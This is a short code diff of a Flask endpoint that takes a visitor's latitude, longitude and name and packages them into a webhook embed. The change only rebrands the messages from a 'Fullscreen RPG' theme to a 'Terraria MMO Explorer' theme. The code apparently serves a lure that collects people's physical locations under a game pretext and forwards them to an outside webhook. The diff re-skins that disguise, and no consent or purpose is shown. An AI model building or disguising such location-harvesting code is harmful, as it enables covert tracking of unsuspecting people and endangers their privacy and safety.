@@ -57,7 +57,7 @@ def send_data():
     payload = request.get_json(silent=True) or {}
     latitude = payload.get('latitude')
     longitude = payload.get('longitude')
-    player_name = payload.get('name', 'Fullscreen Explorer')
+    player_name = payload.get('name', 'Terraria MMO Explorer')
 
     if latitude is None or longitude is None:
         return jsonify({"status": "error", "message": "Missing coordinates"}), 400
@@ -65,8 +65,8 @@ def send_data():
     webhook_payload = {
         "embeds": [
             {
-                "title": "🗺️ Fullscreen RPG Adventurer Started",
-                "color": 65535,
+                "title": "🌲 Terraria MMO Explorer Connected",
+                "color": 3447003,
                 "fields": [
                     {"name": "Hero Name", "value": str(player_name), "inline": False},
                     {"name": "Latitude", "value": str(latitude), "inline": True},
